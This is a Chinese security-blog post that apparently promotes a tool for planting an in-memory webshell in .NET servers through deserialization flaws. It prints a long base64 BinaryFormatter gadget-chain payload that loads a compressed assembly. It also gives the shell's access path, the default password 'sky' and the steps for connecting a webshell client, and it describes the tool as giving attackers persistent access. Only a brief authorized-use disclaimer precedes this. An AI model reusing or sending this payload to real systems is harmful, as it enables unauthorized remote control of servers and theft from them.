---
title: .NET 一款反序列化注入天蝎内存马的工具
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247494406&idx=1&sn=d670340b90ceaae0dfa6cd65d2fcb236&chksm=fa5945ebcd2eccfd99a97b655dbdf1cd07f1c91c691736678b13ab14601304d378a8cf4fe472&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-08-13
fetch_date: 2025-10-06T18:06:49.813813
---

# .NET 一款反序列化注入天蝎内存马的工具

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8iaBUBj3s5ib1P4b8scuibF9R8QyMzeLaM4HEoNsIhGaMQ4KTA3mdu8IPowt19kkE5kDdmUy1go73hA/0?wx_fmt=jpeg)

# .NET 一款反序列化注入天蝎内存马的工具

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面

02

基本介绍

Sharp4MemorySkyPayload 是一款专门设计用于通过.NET反序列化注入内存马的工具。这款工具包含的负载通过利用.NET的反序列化机制，能够将一个内存马注入到目标系统的内存中。使用该工具后，攻击者可以通过一个虚拟路径访问服务器，获取Shell路径和服务器的基本信息。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8iaBUBj3s5ib1P4b8scuibF9R1aMibAYiaJGP5hEKjXxxbS4rDzOdiaA3icGvC6DTmIAjqsz4QwCaH6VJpw/640?wx_fmt=jpeg&from=appmsg)

03

使用方法

Sharp4MemorySkyPayload 的使用非常简单，只需发送一段BASE64编码的反序列化负载即可，以下是其基本用法的示例。

```
AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAAGBwAAAPI6PFJlc291cmNlRGljdGlvbmFyeQp4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIgp4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIKeG1sbnM6cz0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiCnhtbG5zOnI9ImNsci1uYW1lc3BhY2U6U3lzdGVtLlJlZmxlY3Rpb247YXNzZW1ibHk9bXNjb3JsaWIiCnhtbG5zOmk9ImNsci1uYW1lc3BhY2U6U3lzdGVtLklPO2Fzc2VtYmx5PW1zY29ybGliIgp4bWxuczpjPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5JTy5Db21wcmVzc2lvbjthc3NlbWJseT1TeXN0ZW0iCj4KICAgPHM6QXJyYXkgeDpLZXk9ImRhdGEiIHg6RmFjdG9yeU1ldGhvZD0iczpDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmciPgogICAgICA8eDpBcmd1bWVudHM+CiAgICAgICAgIDxzOlN0cmluZz5INHNJQUFBQUFBQUVBTzFaZVd3YzUzVi9jK3pCbGJnV1Nac1NaVXBlV1pLOWtXbHFTWkV1WlNlMkpCN2lTdVR5MkNVcFNyS3AzZVdJWEdsMlp6MHp5MHYxSWRTT3JjUkpIVlFJM0tEcEViUkYzUVNGNFJhTlVidEJYQVJKalVCQUVpQXRHalNJQThSSWdpQXhrUFJBa3NMcTc3MlpKWmNVcGZpZm9FRGhJZmQ5M3p1K2QzL2Z6T3dPbjM2Uk5DTFM4YmwrbmVnMThxNGo5SnV2cC9HSjN2VVBVZnE3dW10N1hsT0dydTNKekJlY1dObTI1dXhzTVpiUGxrcVdHOHNaTWJ0U2loVktzYjZSZEt4b3pScnQ5ZldSZmI2TzBYNmlJVVdqNXRpcjU2dDYzeVoxenhabEM5Rk9JRUdQOW1RUFFHelZzVzB5VnoyL2lkWkdjVXIxcGhvZGVaWkYrWDl0WEIzazJnZTlVMzdBZjZWdUV1UTVvcTN2SXhjM1hQQXZYSU9HZ1EvVzRPMnVzZVJpZkdhSEp5dXhickFQOHJsMjI3SHo1UHNHSHlYUTF2VnlJQjlwdHczVHl2dStudk4xeFc2UU83YlJ6WE05M2pnb1N3TDBJZ3B6dFlsSWVUOHhibkkxSlhUNmtpTHJHOVE0T2l0aVkxcU94T0YzSkJnUEFGb29hV1JMUE1UVE1JTTZnTzJmUUZXVXBsQkRxUG11ZzU5dENGa1I1cUFISWx2RE5hSmJxMVNySHFDK3JybXpOVnkza1I5bGNCc3Z0VnREVkc3U3cvWnVqQllzUkpvN2JnODMxK0JXQTBDVDNxRGJkNE1VYjJRczBCQ3dqd0R6cEpwOFVzaEJTb05Od1laZy9IYVEvTUd6ZlFmSE9jRFN6ZXRwZnc0YXRQMFQ2OTdPMUEzOHQ1a2g2STVWeGxvZ0xTenlxNXV0UlgrVjR6dFhSZTdjUkdRM2k3VGVVcVFuZklQWDFpNkFBMXpMQUozeFdnbTEzQTJpS2luUjdCZkR0ZG1SckQyQk11dXFlb21IRGRuemFoc0pjbVdEVWxoUFdIK0NOL0NCNEFIcEc1VmdnYytpQmkxK0YyUWlRU20wcDlHcmVZejl5cWthTjFPd1RkMStRSTN2QVVtejdyNFpZeTh6UGxsbDFHdnFKVGJwUUZ0d1ZXWWZ5eXhVWlVLYVUxL0wzYjlPd3hiN0trSjM3bUdpTDZFSHJIc1pqV3cvOERERTR1eXovb1RHa2ZseDdmQzJiWVBzQWZVU3M2d1BZZW9ja0RBUDhKNzVJV1FDbkdmblBzNlB6dm54cG9HMWFaQ25XcnlOelc1c0ZrbDMvSDdNMmg3U2JycGp0b1N3WTdUUVRYZE1KT2dWQ3pzTHhhcVRZbUhidG1PNC80UjZTZHl5RGdLN1I3MFVXRU9DOWgrRi9kMGpXMDRTdk5XVEQxZmxnMnZJZ2QwZWo4ZUFQd1lsWThmU0o0NHAvdW5EWjlsQ1YzdWkvVkRpVU1kaGtneVpmSTVoNmQ0bmliNkE4ZDk1bm5idFFtbk9ZWW5uY1ppOGdjRDJUcVNwcjlFNzYvY2VuMGoyWWN3QVB3TFZlNCtaVnM0L3I5QU95dFFkbjFQcStMejgxZjVEMU95ZGZTMWVQZVQyd3pxUVBEcm9INnNCZjlUOWorTGptbWlNK040SHlhREhnSDJNRmdIL1dPQmZDM3hBMmFzRWFWb1pBRFNVeHlENWFlVUZ6RjhXaXF0bTFDQmRGZmcxOVhYQWYxTlp6LytvSnVEdG1nbjVwTWFyVWhyVFg5Tlk1dzgxNW9aMDVyYnB6TzBST0tTelRFbm9mNk8vSUs1NS9ubFoza2JiSlNMR1ZHQWNkNTNNR1d1VHlEVm9ZT3hoWUEySXVCNzhON0ZPb1dzMThHK1ZZY0MzQkw0RE9CcGpLeC9kOFRvMWdkSjZkeFhiQ2V6M0JQc0tmUWM4alo0WDdESzlneHVXUnE4SzlsWDZCVENkdnU1ajd3RUwwQTk4TEtyc1J6emh2UjdXck54SElickh4MHBLQjA3R0U0SjlOSHhaZVlpMjBQRGVOZXRiNkp3ditWbmxFY1R5ekNwdkVOaWlQSmg4TmZ5R01rWlJlc3JIdmkzWWN6NzJFOEU0Zzl0VXJ2eWQzRVIwYnczY3R1bGNwVU1xZDhuSkdzcWR2c3dZdlk2emRwbzRXM1VDcy9RTjlSd1Y2UHVxZ2ZuUDFZdjBPSVcxeHdGajJnSXRVNXQyaWE3UWhQWVU0S09ZTDVNaGxHWHRXY0RMMnNjQVg5QStDZmdIUXZrVG1iK3NYUVY4UmZzTWZZcStydjBwdFAySDlwZjBoNlRvZzhMOVBDZ3QrcXYwWjdSUC95SzlqTDMyaHREZnhQeXMvcytRdktBM29Rdll3emZwc3Y0OWNIOWZqNEh5a3Y0alFLNWFnMVNyUWFyVUlOWDVFSEYyRzZRMkxUTFAwbC9vUDZXM01QOEZKVVhiSHFGZm9kZjE5d0RmMG5VbFNmK3ExeW50cU5oMndDYUtLZGZRTVQrZ1gwS3pqcXdGWk5kOVR1RzkvWi9LSk9CN0FpUHFKRGdSWkZwRm5WanFOdlFIZDNBZDZVOXZmR0o1dGVZcDB0c1hFekxXMGlKeTdwQm8xT1U1U1I3VlBqeHN6VlpNNDJGeUZ1YXpIWW5PWXZ1c2FWSS9wYlBGc21tTVp0MzVVZHRhS013YXRrK2FMTmh1SldzT0ZFeGpQYVd2WUJ0NTE3S1hxZWprTGRzczVDaTk3TGhHa1VaeUY4RHhzZllwSTFjemJSKzBIQmNuSC9sYTFsbXN0WFdEbFhZZWFHWmhsVTR6NXlIWWE1VmNvK1JTc2xSd0MxbXpzR0pRMG1HdHZnSmliZjFMQmNkMWFGV1pqeDgzWExHRmNjMU9qYSs5MmZ3OCs4cWowV2VVamRLc1VjcXZpdlJhcG9sRkJhdmtVTEsvVkNrYWRqWUhkWDFaMThnVWlxSjM0OUk1dzUzeHJmdGFraU9FbTRHUlJkNGdSVDd6cUcxbmw0Y3dKYmhnenRyZzhOTGVLakxyKzFzd0hHSDAxZUNjRm84NklMUFZSYlZDSHFzbW03WEpYRmdyVHUxOE5RNVdVSEh6YVRkcnI5WjV2Rkp5RVRTeVVpeERsWjAyN0lWQ25zMExJY3Q1R2pmTTdKTE1uS011N29DNWltdVF2NURGd01vVnpJSzd2TWF0OW1uVlRJWmZRdnBMZVd1V0s4TkJUbVFHZW1Da3RHREFtUUhiS2g3TE9zWURYZDRkbG12Z3p3WmR0eXdCUW9Ia3NtTGJIQ3pUeDQzSEs0YmowV3Zudmt6L2twR3ZzTnVjTmNsSzczeldKbDl4eGk0VSswdXpsTEdHckVXME1TODhXaTZiaGJ5RUt2Sko1RzFwNUx6d2hvelNIRWpqUnRGYU1HZ282N2hWYnJxU2N6eWRjQlNySVZNMnMzbUQvRjNUWDBJMXJGS1IzUjQzNXRBZWhyM1pSdkpDY3NySXMrSEg1Q05UZGdGSlpUN1h4N0FuWE1tM0NIa1VHczZXeGVWYVk1T0c3U0FVRWF2TzBhNTJscjN5dHozelJ0SlZMaWVreHJXcW5ZeUZ6SEFidUFYRXp1WElGa3BlczQ3YXhrTEJxc2kyUExic29uT0drU0Y3MmQ4ZFZua21XVUpwc3FJbjZhUXFwamxpOXhmTHdJN096dUpzZTY1bGxIcHBrbzdpZUI3QWUrTThuYVpPSEkyb0VCMEhwUUw4RVBoVittSElYYVJodW9DeGdGVW1qVUxXb2g0NkFlNHh3Qnlkd3JoQWVTclJtT2dwUW8rTDlhY29oUWVqYWJ5SXAyUmRHdElaUEQ0eFBRSCtGR0FGV29xd1Y0U2U0eGd2MEN4R0UvcHlzSmY4TGRoTFEwOFBkRE92aTA0UzUyTUNZeExqVWVoTDRuWTF6cmRkU0I2ajN3RzE0Tk43MTQxNTVJbmxzdERiRFYrUzhOdUZYVjUzVlBMV2kwODNjdGNIUFFYNHRZSlZYZkJsQ240ZndwaUIzUlh3VjZDckE3SVh5Rm5ueDlySTZ6bU9jZWlmZ213QzlDeHNlM2I2a2JjSzlIY0N1N2pxenhEbUxIOWE4dE9CdkEzQ2JnVzBUc2duTUMrQm01QzhEU1BEV2FGM3c0UE1MZnpJK0hsZUVUdUhvWS90RE9Cekd2dzUrSm1ISGhkNnVGOFd4Yy8zcDNjVy9wMkFSOU1TWVZycTVlazlCUmt2M3p5T1NsMHFRczhEbi9EcjRNbTdmajl4LzNJL0xjUGlnT2pOUTM1U3hrT1NoN1RrYVJGMk9hL3I3U2VvVENQZ1dadlVuZnVEK3lrUE82YjRzUXgvSEQvdkp2aDlVaC9QMzBxTlAvMjBCTDA1NEJQUWZPdDhsQ0hQZldjQlAzV0R2VzU0bWdldFcrcDZISHBIZ1YrRUhkd0xwWDg1MzhkcjdKV0JqOTAwbnB2NVVUdE9yL1lMVzVtVmZoOWVyVWNmN0hUQ2FxZlU1UVRraHFSMnkwTHZnSTVwaWNQRTUwSk52ajMvOHZBc0ovdWU0MHRqNWMzMzNkcllqOHF1U0wreFI5UFFzd1FQMk80U3pvZHAyV2VXNkorVVdnekFkcmUvYjAzUTA4QXkwamNwZU9qbE55SDd0eHZ4N
```

通过.NET反序列化漏洞，Sharp4MemorySkyPayload能够将内存马注入到目标系统的内存中，注入成功后，将返回当前的Shell路径以及服务器的基本信息。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8iaBUBj3s5ib1P4b8scuibF9RXoFvjTia0Z8go4vkQmnk5FrB5PranBSsK0SzynNjoQ4nFdA6aHQsmnw/640?wx_fmt=png&from=appmsg)

接着，可以通过访问路径 /dotNetMatrix/dotnet.aspx 获取内存马的执行结果，如果返回空白和状态码200，表示注入成功。随后，使用天蝎客户端连接Shell，密码默认设置为 sky，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8iaBUBj3s5ib1P4b8scuibF9RHlM5vibhdmtapU64wkjmIZXbEO0aBWyA3trl2Zib2D3ScwRVmwFiadRUg/640?wx_fmt=png&from=appmsg)

04

基础功能

Sharp4MemorySkyPayload 目前支持多种反序列化格式，这些格式通常存在于.NET框架的序列化和反序列化过程：

BinaryFormatter：.NET框架中最常见的二进制序列化器，用于将对象序列化为二进制流； LosFormatter：一种更灵活的序列化器，主要用于将复杂对象转换为二进制数据；NetDataContractSerializer：在WCF（Windows Communication Foundation）服务中常用的序列化器，允许对对象进行跨应用程序域的序列化和反序列化；SoapFormatter：用于将对象序列化为SOAP格式，主要用于跨平台数据交换。

计划在后续版本中添加对ViewState反序列化的支持。ViewState是.NET中用于保持页面状态的一种机制，通过ViewState反序列化攻击，可能会进一步利用这个工具在Web应用程序中注入内存马。

综上，Sharp4MemorySkyPayload 提供了一种强大的工具，通过.NET反序列化漏洞注入内存马，从而帮助攻击者在目标服务器上获得持久性访问权限。工具已经打包在星球，感兴趣的朋友可以加入自取。

05

推荐阅读...